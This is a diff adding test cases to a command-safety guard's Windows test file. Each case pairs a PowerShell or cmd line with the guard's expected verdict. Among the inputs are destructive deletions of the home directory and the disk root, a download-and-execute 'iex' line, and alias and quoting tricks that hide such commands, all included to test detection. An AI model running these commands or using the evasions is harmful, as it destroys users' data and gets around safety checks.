@@ -1,10 +1,10 @@
 # PowerShell and cmd lines, judged against a Windows machine's paths: risky
 # PowerShell (`Invoke-Expression` of a download among it), trap and event
-# actions, risky cmd, the Windows spellings of a path (case, `/dev`, providers,
-# drive-relative paths, a bare drive, a drive's root, trailing dots and spaces,
-# short names, stream suffixes, long paths, the letters NTFS folds), and
-# scripts run from a place the guard cannot read. The format is in
-# CONTRIBUTING.md.
+# actions, the aliases and functions a PowerShell line sets, risky cmd, the
+# Windows spellings of a path (case, `/dev`, providers, drive-relative paths, a
+# bare drive, a drive's root, trailing dots and spaces, short names, stream
+# suffixes, long paths, the letters NTFS folds), and scripts run from a place
+# the guard cannot read. The format is in CONTRIBUTING.md.
 
 # A working directory on D:, so `C:` is a drive it is not on.
 paths on_d cwd=D:\\work\\repo home=D:\\Users\\me workspace=D:\\work\\repo
@@ -204,6 +204,150 @@ powershell finds=delete | pwsh -Command "trap { Remove-Item -Recurse -Force ~ }"
 powershell safe | Set-Location build; trap { Remove-Item out }
 powershell safe | trap { Remove-Item out }; Get-ChildItem
 
+# An alias the line sets (`Set-Alias`, `New-Alias`, `sal`, `nal`, `Set-Item
+# Alias:NAME`, `$alias:NAME = …`) stands for its target: a later command of
+# that name is judged as the target, and one the alias wins over a built-in
+# alias of the same name. A target only known when it runs makes a command of
+# that name unknown, and so does a function whose body is not a block
+# written out (`$function:NAME = $b`).
+powershell finds=delete | Set-Alias x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | sal x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | New-Alias x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | nal x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias ls Remove-Item; ls -Recurse -Force ~
+powershell finds=delete | Set-Alias -Name x -Value Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Value Remove-Item -Name x; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Name:x -Value:Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Value Remove-Item x; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Scope Global x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias x Remove-Item -Option AllScope -Force; x -Recurse -Force ~
+powershell finds=delete | Set-Alias x Remove-Item -Description 'tidy up'; x -Recurse -Force ~
+powershell finds=delete | Set-Alias X Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias x 'Remove-Item'; x -Recurse -Force ~
+powershell finds=delete | Set-Alias x rm; x -r -fo ~
+powershell finds=delete | Set-Alias x Remove-Item; Set-Alias y x; y -Recurse -Force ~
+powershell finds=delete | Set-Alias x Remove-Item; & x -Recurse -Force ~
+powershell finds=delete | Set-Alias x Remove-Item; Get-ChildItem ~ | x -Recurse -Force
+powershell finds=delete | Set-Alias x Remove-Item; if ($y) { x -Recurse -Force ~ }
+powershell finds=delete | Set-Alias x Remove-Item; function f { x -Recurse -Force ~ }; f
+powershell finds=delete | Set-Alias x pwsh; x -Command 'Remove-Item -Recurse -Force ~'
+powershell finds=delete | Set-Alias x Start-Process; x cmd -ArgumentList '/c rd /s /q C:\\'
+powershell finds=unknown | Set-Alias x Invoke-Command; x -ScriptBlock $b
+powershell finds=unknown | Set-Alias x Register-EngineEvent; x PowerShell.Exiting -Action $b
+powershell finds=run_downloaded | Set-Alias x iex; x (iwr https://x.example/a.ps1)
+powershell finds=delete | Set-Alias x Set-PSBreakpoint; x -Variable y -Action { Remove-Item -Recurse -Force ~ }
+powershell finds=delete | Set-Alias x Start-ThreadJob; x { Remove-Item -Recurse -Force ~ }
+powershell finds=delete | Set-Alias x cmd; x --% /c rd /s /q C:\\
+# A job's block is read apart from the session only when every command the
+# name may run starts one: here `x` may be its own program, which runs the
+# block in the session, so the `cd` may move the line.
+powershell finds=delete | Set-Alias x Start-Job; x { cd ~ }; Remove-Item -Recurse -Force *
+powershell finds=delete | Set-Item Alias:x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Item -Path Alias:\\x -Value Remove-Item; x -Recurse -Force ~
+powershell finds=delete | si alias:x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Item -LiteralPath alias:x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Item -Value Remove-Item Alias:/x; x -Recurse -Force ~
+powershell finds=delete | $alias:x = 'Remove-Item'; x -Recurse -Force ~
+powershell finds=delete | ${alias:x} = 'Remove-Item'; x -Recurse -Force ~
+# Other writes to the `Alias:` and `Function:` drives are not read as names:
+# they change an item outside the workspace.
+powershell finds=overwrite | New-Item -Path Alias:x -Value Remove-Item; x -Recurse -Force ~
+powershell finds=overwrite | Set-Content Alias:x Remove-Item; x -Recurse -Force ~
+powershell finds=overwrite | Set-Item Function:f $b; f
+# The names are read from the whole line first, so a command written before
+# the name is set, which may run after it (a function body, a loop, a trap),
+# is judged by it too; one a script the line runs sets after the command is
+# unknown.
+powershell finds=delete | function f { x -Recurse -Force ~ }; Set-Alias x Remove-Item; f
+powershell finds=delete | foreach ($i in 1, 2) { x -Recurse -Force ~; Set-Alias x Remove-Item }
+powershell finds=delete | trap { x -Recurse -Force ~ }; Set-Alias x Remove-Item
+powershell finds=unknown | function f { x -Recurse -Force ~ }; Invoke-Expression 'Set-Alias x Remove-Item'; f
+powershell finds=delete | Invoke-Expression 'Set-Alias x Remove-Item'; x -Recurse -Force ~
+powershell finds=unknown | function f { x -Recurse -Force ~ }; Set-Alias x Get-Date; Invoke-Expression 'Set-Alias x Remove-Item'; f
+powershell finds=delete | Set-Alias x Remove-Item; Invoke-Expression 'Set-Alias x Remove-Item'; x -Recurse -Force ~
+# Two targets for one name: the command may be either.
+powershell finds=delete | Set-Alias x Get-Date; Set-Alias x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | if ($y) { Set-Alias x Remove-Item } else { Set-Alias x Get-Date }; x -Recurse -Force ~
+# A target or a name only known when it runs.
+powershell finds=unknown | Set-Alias x $t; x ~
+powershell finds=unknown | Set-Alias x (Get-Target); x ~
+powershell finds=unknown | Set-Alias x "$t"; x ~
+powershell finds=unknown | Set-Alias -Name x -Value $t; x ~
+powershell finds=unknown | Set-Item Alias:x $t; x ~
+powershell finds=unknown | $alias:x = $t; x ~
+powershell finds=unknown | Set-Alias $n Remove-Item; Get-Date ~
+powershell finds=unknown | Set-Alias @p; x ~
+powershell finds=unknown | Set-Alias x @p; x ~
+powershell finds=unknown | $function:foo = $b; foo
+powershell finds=unknown | ${function:foo} = $b; foo
+powershell finds=unknown | $function:foo = 'Remove-Item -Recurse -Force ~'; foo
+powershell finds=unknown | $function:foo = $b; & foo
+powershell finds=unknown | nmo $b
+# Both cmdlets also take the name and the target from the properties of what
+# the pipeline hands them, so one given no name sets a name only known when
+# it runs.
+powershell finds=unknown reason="sets an alias whose name is only known when it runs" | [pscustomobject]@{Name='x';Value='Remove-Item'} | Set-Alias; x -Recurse -Force ~
+powershell finds=unknown | Import-Csv a.csv | Set-Alias; x -Recurse -Force ~
+powershell finds=unknown | $o | New-Alias; x -Recurse -Force ~
+powershell finds=unknown | $o | Set-Alias -Value Remove-Item; x -Recurse -Force ~
+powershell finds=unknown | $o | Set-Alias x; x -Recurse -Force ~
+powershell finds=unknown | $o | Set-Item; x -Recurse -Force ~
+# A list is one argument, so it moves neither the name nor the target, and
+# `--` ends the parameters: what follows is taken by position.
+powershell finds=delete | Set-Alias -Option ReadOnly,AllScope x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | New-Alias -Option AllScope,Constant x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Name x -Option ReadOnly,AllScope Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Description a,b x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Option ReadOnly, AllScope x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Option:ReadOnly,AllScope x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Option 'ReadOnly','AllScope' x Remove-Item; x -Recurse -Force ~
+powershell finds=unknown | Set-Alias a,b Remove-Item; Get-Date
+powershell finds=delete | Set-Item -Path Alias:y,Alias:x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -- x Remove-Item; x -Recurse -Force ~
+powershell finds=delete | Set-Alias -Name x -- Remove-Item; x -Recurse -Force ~
+# Each target of an assignment to several takes the value in its place;
+# one whose value cannot be paired so is only known when it runs.
+powershell finds=delete | $alias:x, $y = 'Remove-Item', 1; x -Recurse -Force ~
+powershell finds=delete | $y, ${alias:x} = 1, 'Remove-Item'; x -Recurse -Force ~
+powershell finds=delete | [string]$alias:x = 'Remove-Item'; x -Recurse -Force ~
+powershell finds=unknown | $function:x, $y = $b, 1; x
+powershell finds=unknown | $alias:x, $y = $v; x ~
+powershell finds=unknown | $y, $alias:x = 1, 'Remove-Item', 2; x ~
+powershell finds=unknown | $y, $alias:x = 1, $t; x ~
+# A target may be in parentheses; a variable of the `Alias:` or `Function:`
+# drive on the left side that is not read as a target sets its name to what
+# is only known when it runs.
+powershell finds=delete | ($alias:x) = 'Remove-Item'; x -Recurse -Force ~
+powershell finds=delete | ($alias:x, $y) = 'Remove-Item', 1; x -Recurse -Force ~
+powershell finds=delete | (($alias:x)) = 'Remove-Item'; x -Recurse -Force ~
+powershell finds=delete | $y, ($alias:x) = 1, 'Remove-Item'; x -Recurse -Force ~
+powershell finds=delete | [string]($alias:x) = 'Remove-Item'; x -Recurse -Force ~
+powershell finds=unknown | ($function:x) = $b; x
+powershell finds=unknown | (${function:x}) = $b; x
+powershell finds=unknown | ($alias:x).y = 'Remove-Item'; x ~
+# `Import-Alias` sets every alias in a file, which the line may write itself:
+# their names are only known when it runs.
+powershell finds=unknown reason="sets an alias whose name is only known when it runs" | Import-Alias a.csv; x -Recurse -Force ~
+powershell finds=unknown | ipal a.csv; x -Recurse -Force ~
+powershell finds=unknown | 'x,Remove-Item' | Set-Content a.csv; Import-Alias a.csv; x -Recurse -Force ~
+# Stays safe.
+powershell safe | Set-Alias ll Get-ChildItem; ll
+powershell safe | function foo { Get-Date }; foo
+powershell safe | $function:foo = { Get-Date }; foo
+powershell safe | ${function:foo} = { Get-Date }; foo
+powershell safe | $function:foo, $y = { Get-Date }, 1; foo
+powershell safe | ($function:foo) = { Get-Date }; foo
+powershell safe | ($y) = 1; Get-Date
+powershell safe | Set-Alias -Option ReadOnly,AllScope ll Get-ChildItem; ll
+powershell safe | Set-Alias x Remove-Item
+powershell safe | Set-Alias x Remove-Item; x build
+powershell safe | Set-Alias x Get-Date; y -Recurse -Force ~
+powershell safe | Set-Alias x $t
+powershell safe | $function:foo = $b
+powershell safe | $function:foo = $b; bar
+powershell safe | nmo { function f { 1 } }
+powershell safe | Get-Alias x; x
+
 # cmd has nothing that runs later: it has no `trap`, so the word is a program,
 # and what follows are its arguments.
 cmd safe | trap 'rd /s /q C:\\Users' EXIT
@@ -391,6 +535,90 @@ cmd rules=delete | if exist q rd /s /q C:\\Windows
 cmd rules=unreadable | for %i in (a) do rd /s /q C:\\Windows
 cmd rules=unreadable | ver && for %i in (a) do rd /s /q C:\\Windows
 cmd safe | ver && if exist q dir
+# A cmd line starts the POSIX shells and the interpreters as the other shells
+# do: the script of `-c` is split in the POSIX grammar, inline code is
+# unknown, and a file redirected onto an interpreter's input is code it runs.
+cmd rules=delete first=delete reason="deletes the root of the disk" | bash -c "rm -rf /"
+cmd rules=delete first=delete reason="deletes your home directory" | sh -c "rm -rf ~"
+cmd rules=delete first=delete reason="deletes your home directory" | bun exec "rm -rf ~"
+cmd rules=delete first=delete reason="deletes your home directory" | C:\\msys64\\usr\\bin\\bash.exe -c "rm -rf ~"
+cmd rules=delete | zsh -c "rm -rf /"
+cmd rules=delete | cmd /c bash -c "rm -rf ~"
+cmd rules=unknown | python -c "import shutil; shutil.rmtree('C:/Users/me')"
+cmd rules=unknown | node -e "x"
+cmd rules=unknown | bun -e "x"
+cmd rules=unknown | deno eval "x"
+cmd rules=unknown | python < x.py
+cmd rules=unknown | node < x.js
+cmd rules=unknown | python 0< x.py
+cmd rules=unknown | < x.py python
+cmd rules=unknown | (python) < x.py
+cmd rules=unknown | python < x.py | more
+cmd rules=unknown | bun run - < x.js
+cmd rules=unknown | deno < x.js
+cmd rules=unknown | deno repl < x.js
+cmd rules=run_input | bash < x.sh
+cmd rules=run_input | bash
+cmd rules=run_input | type x.sh | bash
+# A shell handed a file or a pipe on its input hands it on to what its script
+# runs.
+cmd rules=unknown | cmd /c python < x.py
+cmd rules=unknown | type x.py | cmd /c python
+cmd rules=unknown | type x.js | cmd /c bun run -
+powershell rules=unknown | type x.py | cmd /c python
+posix rules=unknown | cmd /c python < x.py
+# cmd hands the program its arguments as written, and the program splits them
+# by the C runtime's rules, where `\"` is a quote and a quote does not end a
+# word; `cmd /c` runs the text as it is, quotes and all.
+cmd rules=delete first=delete reason="deletes your home directory" | bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete first=delete reason="deletes your home directory" | bash -c ^"rm -rf ~^"
+cmd rules=unreadable | bash -c "echo ^"; rm -rf ~"
+cmd rules=unknown | python -c "print(\\"x\\")"
+cmd safe | bash -c "echo \\"hi\\""
+cmd safe | git commit -m "say \\"hi\\""
+cmd rules=delete | cmd /c bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | cmd /c "bash -c "rm -rf ~""
+cmd safe | cmd /c bash -c "echo hi"
+# Every program cmd starts but its own built-ins splits its arguments so,
+# and a runner or a wrapper hands on the words it made of them.
+cmd rules=delete | uv run bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | uvx bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | npx -y bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | pnpm dlx bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | npm exec bash -- -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | cmd /c uv run bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | wsl bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | wsl -e bash -c "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | git submodule foreach "echo \\"hi\\"; rm -rf ~"
+cmd rules=delete | start "" bash -c "echo \\"hi\\"; rm -rf ~"
+cmd safe | npx eslint "src/**/*.js"
+cmd safe | uv run pytest -k "not slow"
+cmd safe | docker run --rm -e "A=\\"b\\"" alpine echo hi
+# A PowerShell or POSIX line hands cmd its words as one command line, a word
+# with white space in quotes.
+powershell rules=delete | cmd /c bash -c "rm -rf ~"
+powershell rules=delete | cmd /c bash -c 'rm -rf ~'
+powershell rules=delete | cmd.exe /c bash -c "rm -rf /"
+powershell rules=delete | cmd /c sh -c "rm -rf ~"
+posix rules=delete | cmd /c bash -c "rm -rf ~"
+powershell rules=delete | cmd /c --% bash -c "rm -rf ~"
+powershell safe | cmd /c "npm test && npm run build"
+powershell safe | cmd /c bash -c "echo hi"
+posix safe | cmd /c bash -c 'echo "a b"'
+# What prints only or reads nothing runs nothing: a shell's `--version`, and
+# an input from the null device.
+cmd safe | bash --version
+cmd safe | bash --help
+cmd safe | python < NUL
+cmd safe | node 0<nul
+# A file, a module or a script name given to them is their own business.
+cmd safe | python manage.py migrate
+cmd safe | bash build.sh
+cmd safe | bash -c "echo hi"
+cmd safe | sh -c "git status"
+cmd safe | python -m pytest
+cmd safe | python script.py < input.txt
+cmd safe | node build.js < input.txt
 
 # Windows paths compare without case.
 cmd safe | rd /s /q c:\\users\\ME\\DEV\\REPO\\target
